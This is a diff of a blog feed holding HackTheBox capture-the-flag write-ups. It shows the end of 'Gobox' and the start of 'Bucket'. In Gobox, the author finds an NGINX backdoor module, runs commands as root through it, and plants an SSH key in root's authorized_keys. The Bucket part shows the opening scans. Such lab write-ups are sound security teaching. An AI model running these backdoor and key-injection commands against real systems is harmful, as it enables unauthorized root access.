-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>Based on the configuration above and the <code>docker-compose.yml</code> file I found under <code>/opt/website/</code>, the server that listens on port 4566 is routed into the internal port 9000 which is mapped into the LocalStack container (host:4566 [with auth]-&gt;host:9000-&gt;container-localstack:4566).</p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre>
+</figure><p>Based on the configuration above, the server that listens on port 4566 is routed into the internal port 9000 which is mapped into the LocalStack container (host:4566 [with auth]-&gt;host:9000-&gt;container-localstack:4566).</p>
 <p>To confirm that, I run another scan against port 4566, and <code>nmap</code> shows that it&rsquo;s open, but it&rsquo;s forbidden because there is authorization check.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97»
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97»
 </span></span><span class="line"><span class="cl">$ nmap -sV -sC -p4566 10.10.11.113
 </span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-08 06:51 EDT
 </span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> gobox.htb <span class="o">(</span>10.10.11.113<span class="o">)</span>
@@ -348,9 +369,10 @@
 </span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 13.35 seconds
-</span></span></code></pre></div><p>Since I know the correct authorization value, I can add it to the authorization header and get access to port 4566.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97»
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 13.35 seconds</span></span></code></pre>
+</figure><p>Since I know the correct authorization value, I can add it to the authorization header and get access to port 4566.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97»
 </span></span><span class="line"><span class="cl">$ curl -sv http://10.10.11.113:4566/ -H <span class="s1">&#39;Authorization: Basic SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz&#39;</span>
 </span></span><span class="line"><span class="cl">*   Trying 10.10.11.113:4566...
 </span></span><span class="line"><span class="cl">* Connected to 10.10.11.113 <span class="o">(</span>10.10.11.113<span class="o">)</span> port <span class="m">4566</span> <span class="o">(</span><span class="c1">#0)</span>
@@ -373,21 +395,24 @@
 </span></span><span class="line"><span class="cl">&lt; access-control-expose-headers: x-amz-version-id
 </span></span><span class="line"><span class="cl">&lt;
 </span></span><span class="line"><span class="cl">* Connection <span class="c1">#0 to host 10.10.11.113 left intact</span>
-</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;status&#34;</span>: <span class="s2">&#34;running&#34;</span><span class="o">}</span>
-</span></span></code></pre></div><p>As for port 80 and 8080, it&rsquo;s clear that they are the homepage and the login page site.</p>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;status&#34;</span>: <span class="s2">&#34;running&#34;</span><span class="o">}</span></span></span></code></pre>
+</figure><p>As for port 80 and 8080, it&rsquo;s clear that they are the homepage and the login page site.</p>
 <p>The next one is request routing for port 8000, this is my first time to see &ldquo;command on&rdquo; written on NGINX&rsquo;s config file.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="line"><span class="cl"><span class="k">server</span> <span class="p">{</span>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="line"><span class="cl"><span class="k">server</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="kn">listen</span> <span class="n">127.0.0.1</span><span class="p">:</span><span class="mi">8000</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">                <span class="kn">command</span> <span class="no">on</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>When I try to interact with it, it returns nothing.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/opt$ curl -s http://127.0.0.1:8000
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre>
+</figure><p>When I try to interact with it, it returns nothing.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/opt$ curl -s http://127.0.0.1:8000
 </span></span><span class="line"><span class="cl">www-data@gobox:/opt$ curl -I http://127.0.0.1:8000
-</span></span><span class="line"><span class="cl">curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
-</span></span></code></pre></div><p>With <code>nc</code>, it returns a &ldquo;Bad Request&rdquo;.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/$ nc -vn 127.0.0.1 <span class="m">8000</span>
+</span></span><span class="line"><span class="cl">curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server</span></span></code></pre>
+</figure><p>With <code>nc</code>, it returns a &ldquo;Bad Request&rdquo;.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/$ nc -vn 127.0.0.1 <span class="m">8000</span>
 </span></span><span class="line"><span class="cl">Connection to 127.0.0.1 <span class="m">8000</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!
 </span></span><span class="line"><span class="cl">/
 </span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">400</span> Bad Request
@@ -403,9 +428,10 @@
 </span></span><span class="line"><span class="cl">&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;
 </span></span><span class="line"><span class="cl">&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
 </span></span><span class="line"><span class="cl">&lt;/body&gt;
-</span></span><span class="line"><span class="cl">&lt;/html&gt;
-</span></span></code></pre></div><p>If I look at the date modified of the NGINX folder, there are 6 folders that were modified on August 26 at the same time.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ ls -lt
+</span></span><span class="line"><span class="cl">&lt;/html&gt;</span></span></code></pre>
+</figure><p>If I look at the date modified of the NGINX folder, there are 6 folders that were modified on August 26 at the same time.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ ls -lt
 </span></span><span class="line"><span class="cl">total <span class="m">64</span>
 </span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 snippets
 </span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 sites-available
@@ -422,25 +448,28 @@
 </span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">3957</span> Feb  <span class="m">4</span>  <span class="m">2019</span> mime.types
 </span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root  <span class="m">180</span> Feb  <span class="m">4</span>  <span class="m">2019</span> proxy_params
 </span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root  <span class="m">636</span> Feb  <span class="m">4</span>  <span class="m">2019</span> scgi_params
-</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root  <span class="m">664</span> Feb  <span class="m">4</span>  <span class="m">2019</span> uwsgi_params
-</span></span></code></pre></div><p>When I visit the <code>modules-enabled</code> folder, I find a module with a suspicious name &ldquo;backdoor&rdquo;!</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ ls -l modules-enabled
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root  <span class="m">664</span> Feb  <span class="m">4</span>  <span class="m">2019</span> uwsgi_params</span></span></code></pre>
+</figure><p>When I visit the <code>modules-enabled</code> folder, I find a module with a suspicious name &ldquo;backdoor&rdquo;!</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ ls -l modules-enabled
 </span></span><span class="line"><span class="cl">total <span class="m">12</span>
 </span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">48</span> Aug <span class="m">23</span> 20:50 50-backdoor.conf
 </span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root root <span class="m">61</span> Aug <span class="m">23</span> 14:43 50-mod-http-image-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-image-filter.conf
 </span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root root <span class="m">60</span> Aug <span class="m">23</span> 14:43 50-mod-http-xslt-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
 </span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root root <span class="m">48</span> Aug <span class="m">23</span> 14:43 50-mod-mail.conf -&gt; /usr/share/nginx/modules-available/mod-mail.conf
-</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root root <span class="m">50</span> Aug <span class="m">23</span> 14:43 50-mod-stream.conf -&gt; /usr/share/nginx/modules-available/mod-stream.conf
-</span></span></code></pre></div><p>The module loads a <code>.so</code> file called <code>ngx_http_execute_module.so</code>. I found that file under <code>/usr/lib/nginx/modules/</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ cat modules-enabled/50-backdoor.conf
+</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root root <span class="m">50</span> Aug <span class="m">23</span> 14:43 50-mod-stream.conf -&gt; /usr/share/nginx/modules-available/mod-stream.conf</span></span></code></pre>
+</figure><p>The module loads a <code>.so</code> file called <code>ngx_http_execute_module.so</code>. I found that file under <code>/usr/lib/nginx/modules/</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ cat modules-enabled/50-backdoor.conf
 </span></span><span class="line"><span class="cl">load_module modules/ngx_http_execute_module.so
 </span></span><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ find / -type f -name <span class="s2">&#34;ngx_http_execute_module.so&#34;</span> 2&gt;/dev/null
 </span></span><span class="line"><span class="cl">/usr/lib/nginx/modules/ngx_http_execute_module.so
 </span></span><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ file /usr/lib/nginx/modules/ngx_http_execute_module.so
-</span></span><span class="line"><span class="cl">/usr/lib/nginx/modules/ngx_http_execute_module.so: ELF 64-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, BuildID<span class="o">[</span>sha1<span class="o">]=</span>4279ae42bf642b21378aa43c06b52f4d0b89f2ad, with debug_info, not stripped
-</span></span></code></pre></div><p>I&rsquo;m trying to find the origin of this module by grabbing some readable code using  <code>strings</code>. It turns out the backdoor was taken from this Github repository: <a href="https://github.com/limithit/NginxExecute"target="_blank" rel="noopener noreferrer"
+</span></span><span class="line"><span class="cl">/usr/lib/nginx/modules/ngx_http_execute_module.so: ELF 64-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, BuildID<span class="o">[</span>sha1<span class="o">]=</span>4279ae42bf642b21378aa43c06b52f4d0b89f2ad, with debug_info, not stripped</span></span></code></pre>
+</figure><p>I&rsquo;m trying to find the origin of this module by grabbing some readable code using  <code>strings</code>. It turns out the backdoor was taken from this Github repository: <a href="https://github.com/limithit/NginxExecute"target="_blank" rel="noopener noreferrer"
 >NginxExecute</a>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.97»
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.97»
 </span></span><span class="line"><span class="cl">$ strings ngx_http_execute_module.so <span class="p">|</span> grep <span class="s1">&#39;.c$&#39;</span>
 </span></span><span class="line"><span class="cl">ngx_pcalloc
 </span></span><span class="line"><span class="cl">__ctype_b_loc
@@ -451,10 +480,11 @@
 </span></span><span class="line"><span class="cl">~iHc
 </span></span><span class="line"><span class="cl">/home/ubuntu/NginxExecute//ngx_result.c
 </span></span><span class="line"><span class="cl">7src
-</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
-</span></span></code></pre></div><h4 id="nginx-backdoor">NGINX Backdoor</h4>
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...</span></span></code></pre>
+</figure><h4 id="nginx-backdoor">NGINX Backdoor</h4>
 <p>According to the README file from the repository, I just need to send a HTTP request with <code>?system.run[command]</code>, but it doesn&rsquo;t work here.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ curl -v <span class="s2">&#34;http://127.0.0.1:8000/?system.run[whoami]&#34;</span>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ curl -v <span class="s2">&#34;http://127.0.0.1:8000/?system.run[whoami]&#34;</span>
 </span></span><span class="line"><span class="cl">* Trying 127.0.0.1:8000...
 </span></span><span class="line"><span class="cl">* TCP_NODELAY <span class="nb">set</span>
 </span></span><span class="line"><span class="cl">* Connected to 127.0.0.1 <span class="o">(</span>127.0.0.1<span class="o">)</span> port <span class="m">8000</span> <span class="o">(</span><span class="c1">#0)</span>
@@ -465,23 +495,27 @@
 </span></span><span class="line"><span class="cl">&gt;
 </span></span><span class="line"><span class="cl">* Empty reply from server
 </span></span><span class="line"><span class="cl">* Connection <span class="c1">#0 to host 127.0.0.1 left intact</span>
-</span></span><span class="line"><span class="cl">curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
-</span></span></code></pre></div><p>Running another <code>strings</code> command against the backdoor reveals it uses <code>ippsec.run</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.97»
+</span></span><span class="line"><span class="cl">curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server</span></span></code></pre>
+</figure><p>Running another <code>strings</code> command against the backdoor reveals it uses <code>ippsec.run</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.97»
 </span></span><span class="line"><span class="cl">$ strings ngx_http_execute_module.so <span class="p">|</span> grep <span class="s1">&#39;run&#39;</span>
-</span></span><span class="line"><span class="cl">ippsec.run
-</span></span></code></pre></div><p>Now if I send <code>?ippsec.run[whoami]</code>, it returns:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ curl -g <span class="s2">&#34;http://127.0.0.1:8000/?ippsec.run[whoami]&#34;</span>
-</span></span><span class="line"><span class="cl">root
-</span></span></code></pre></div><p>Using the previous reverse shell script I dropped on <code>/tmp/</code>, I can get an interactive shell access as root, but then the shell gets exited by itself.</p>
+</span></span><span class="line"><span class="cl">ippsec.run</span></span></code></pre>
+</figure><p>Now if I send <code>?ippsec.run[whoami]</code>, it returns:</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ curl -g <span class="s2">&#34;http://127.0.0.1:8000/?ippsec.run[whoami]&#34;</span>
+</span></span><span class="line"><span class="cl">root</span></span></code></pre>
+</figure><p>Using the previous reverse shell script I dropped on <code>/tmp/</code>, I can get an interactive shell access as root, but then the shell gets exited by itself.</p>
 <p><div class="img-container"><img src="imgs/image-20210908184311943.png" alt="image-20210908184311943"  /></div>
 </p>
 <p>So instead, I will inject my SSH public key.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H&#39;</span> &gt; /tmp/iamf
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H&#39;</span> &gt; /tmp/iamf
 </span></span><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ curl -g <span class="s2">&#34;http://127.0.0.1:8000/?ippsec.run[cat /tmp/iamf | tee /root/.ssh/authorized_keys]&#34;</span>
-</span></span><span class="line"><span class="cl">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H
-</span></span></code></pre></div><p>Now I can SSH login as root.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97»
+</span></span><span class="line"><span class="cl">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H</span></span></code></pre>
+</figure><p>Now I can SSH login as root.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97»
 </span></span><span class="line"><span class="cl">$ ssh root@10.10.11.113
 </span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-81-generic x86_64<span class="o">)</span>
 </span></span><span class="line"><span class="cl">
@@ -509,19 +543,21 @@
 </span></span><span class="line"><span class="cl">To check <span class="k">for</span> new updates run: sudo apt update
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Last login: Thu Aug <span class="m">26</span> 23:56:12 <span class="m">2021</span>
-</span></span><span class="line"><span class="cl">root@gobox:~#
-</span></span></code></pre></div><p>I can grab the root flag as well.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@gobox:~# ls -l
+</span></span><span class="line"><span class="cl">root@gobox:~#</span></span></code></pre>
+</figure><p>I can grab the root flag as well.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@gobox:~# ls -l
 </span></span><span class="line"><span class="cl">total <span class="m">12</span>
 </span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root  <span class="m">536</span> Aug <span class="m">24</span> 20:33 iptables.sh
 </span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> root root   <span class="m">33</span> Aug <span class="m">26</span> 21:10 root.txt
 </span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 snap
 </span></span><span class="line"><span class="cl">root@gobox:~# cat root.txt
-</span></span><span class="line"><span class="cl">81d35...<span class="o">[</span>SNIP<span class="o">]</span>...
-</span></span></code></pre></div><h2 id="explore">Explore</h2>
+</span></span><span class="line"><span class="cl">81d35...<span class="o">[</span>SNIP<span class="o">]</span>...</span></span></code></pre>
+</figure><h2 id="explore">Explore</h2>
 <h3 id="undetected-ports">Undetected ports</h3>
 <p>During enumeration, when I printed the networking status, I noticed that ports 9000, 9001, and 4566 should be accessible from external, with the exception that port 4566 needs an authentication header set first to be accessible.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/opt$ netstat -tlpn
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/opt$ netstat -tlpn
 </span></span><span class="line"><span class="cl"><span class="o">(</span>Not all processes could be identified, non-owned process info
 </span></span><span class="line"><span class="cl"> will not be shown, you would have to be root to see it all.<span class="o">)</span>
 </span></span><span class="line"><span class="cl">Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
@@ -536,9 +572,10 @@
 </span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
 </span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::9000                 :::*                    LISTEN      -
 </span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::9001                 :::*                    LISTEN      -
-</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN
-</span></span></code></pre></div><p>It turns out there is a set of <code>iptables</code> rules which drop any connection coming to these ports.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@gobox:~# iptables -L
+</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN</span></span></code></pre>
+</figure><p>It turns out there is a set of <code>iptables</code> rules which drop any connection coming to these ports.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@gobox:~# iptables -L
 </span></span><span class="line"><span class="cl">Chain INPUT <span class="o">(</span>policy ACCEPT<span class="o">)</span>
 </span></span><span class="line"><span class="cl">target     prot opt <span class="nb">source</span>               destination         
 </span></span><span class="line"><span class="cl">ACCEPT     all  --  localhost/8          anywhere            
@@ -546,16 +583,17 @@
 </span></span><span class="line"><span class="cl">DROP       tcp  --  anywhere             anywhere             tcp dpt:9002
 </span></span><span class="line"><span class="cl">DROP       tcp  --  anywhere             anywhere             tcp dpt:9001
 </span></span><span class="line"><span class="cl">DROP       tcp  --  anywhere             anywhere             tcp dpt:9000
-</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
-</span></span></code></pre></div><p><em>Shouldn&rsquo;t it then return with <code>filtered</code> status?</em></p>
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...</span></span></code></pre>
+</figure><p><em>Shouldn&rsquo;t it then return with <code>filtered</code> status?</em></p>
 <p>Well, I think it was purely my mistake. I used <code>--min-rate=10000</code>, so this could be the reason <code>nmap</code> misidentified the filtered port as closed.</p>
 <h3 id="gobox-request-routing">Gobox Request Routing</h3>
 <p>The first time I looked into the NGINX configuration file, it didn&rsquo;t make sense to me why my web shell is on the host OS? In fact, I uploaded my web shell to an S3 bucket, which is also a container.</p>
 <p>Now, with root access obtained, I could understand what was happening, and there was a synchronization process between the host and the LocalStack container.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@gobox:~# cat /var/spool/incron/root 
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@gobox:~# cat /var/spool/incron/root 
 </span></span><span class="line"><span class="cl">/opt/deploy/.localstack/data/recorded_api_calls.json    IN_MODIFY       /usr/bin/aws --endpoint-url http://127.0.0.1:9000 s3 sync s3://website /opt/website
-</span></span><span class="line"><span class="cl">/home/ubuntu/user.txt   IN_MODIFY       cp /home/ubuntu/user.txt /var/www/
-</span></span></code></pre></div><p>So if I upload something into the bucket, the host will have it as well.</p>
+</span></span><span class="line"><span class="cl">/home/ubuntu/user.txt   IN_MODIFY       cp /home/ubuntu/user.txt /var/www/</span></span></code></pre>
+</figure><p>So if I upload something into the bucket, the host will have it as well.</p>
 <p>I also looked at how the web routing is done in this box and eventually visualize it as shown below:</p>
 <p><div class="img-container"><img src="imgs/image-20210912193743912.png" alt="image-20210912193743912"  /></div>
 </p>
@@ -564,10 +602,10 @@
     
     <item>
       <title>HackTheBox - Bucket</title>
-      <link>https://fahmifj.github.io/hackthebox/bucket/</link>
+      <link>https://fahmifj.github.io/ctf/hackthebox/bucket/</link>
       <pubDate>Sat, 24 Apr 2021 22:03:47 +0700</pubDate>
       
-      <guid>https://fahmifj.github.io/hackthebox/bucket/</guid>
+      <guid>https://fahmifj.github.io/ctf/hackthebox/bucket/</guid>
       <description>Pentesting against simulated AWS S3 Bucket </description>
       <content:encoded><![CDATA[<p>Bucket, as the name implies, features a simulated Amazon S3 bucket that has been configured to allow anonymous users to perform read/write operations to the objects inside a bucket. This allows me to drop a web shell into the bucket to gain a foothold on the system. Enumerating on the system discovers several credentials from the DynamoDB and one of them is reused by the user. Inspecting the web configuration files reveals that there is  an internal web currently running as a root user, which then can be exploited to gain root access.</p>
 <h4 id="skills-learned">Skills Learned</h4>
@@ -589,7 +627,8 @@
 <h2 id="reconnaissance">Reconnaissance</h2>
 <h3 id="nmap">Nmap</h3>
 <p><code>nmap</code> shows two open ports: 22 (SSH) and 80 (HTTP).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oA nmap/initial-bucket 10.10.10.212
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
@@ -599,12 +638,13 @@
 </span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET POST OPTIONS HEAD
 </span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
-</span></span><span class="line"><span class="cl">Service Info: Host: 127.0.1.1<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-</span></span></code></pre></div><p>Scanning through all the ports return the same result.</p>
+</span></span><span class="line"><span class="cl">Service Info: Host: 127.0.1.1<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel</span></span></code></pre>
+</figure><p>Scanning through all the ports return the same result.</p>
 <h2 id="enumeration">Enumeration</h2>
 <h3 id="tcp-80---buckethtb">TCP 80 - bucket.htb</h3>
 <p>Visiting this port via browser redirects to <code>http://bucket.htb/</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ curl -s http://10.10.10.212
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">&lt;!DOCTYPE HTML PUBLIC <span class="s2">&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
@@ -615,44 +655,49 @@
 </span></span><span class="line"><span class="cl">&lt;p&gt;The document has moved &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;http://bucket.htb/&#34;</span>&gt;here&lt;/a&gt;.&lt;/p&gt;
 </span></span><span class="line"><span class="cl">&lt;hr&gt;
 </span></span><span class="line"><span class="cl">&lt;address&gt;Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.10.212 Port 80&lt;/address&gt;
-</span></span><span class="line"><span class="cl">&lt;/body&gt;&lt;/html&gt;
-</span></span></code></pre></div><p>I&rsquo;ll add <code>bucket.htb</code> to <code>/etc/hosts</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">10.10.10.212    bucket.htb
-</span></span></code></pre></div><p>Now it displays a web page called &ldquo;Bucket Advertising Platform&rdquo;.</p>
